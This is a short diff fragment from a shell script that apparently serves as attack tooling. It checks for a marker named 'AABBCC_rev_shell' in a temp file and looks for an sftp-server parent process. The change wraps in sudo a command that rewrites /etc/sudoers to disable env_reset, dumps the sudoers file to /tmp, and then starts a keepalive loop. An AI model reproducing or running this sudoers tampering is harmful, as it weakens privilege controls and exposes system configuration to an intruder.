@@ -46,9 +46,10 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 #) &
 
 grep -q AABBCC_rev_shell /tmp/js9 &&
-( 
-sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
-grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt
+(
+ sudo bash -c '
+     sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
+     grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '
 
     (while true; do
         [ ! -f /tmp/keepalive ] && break        
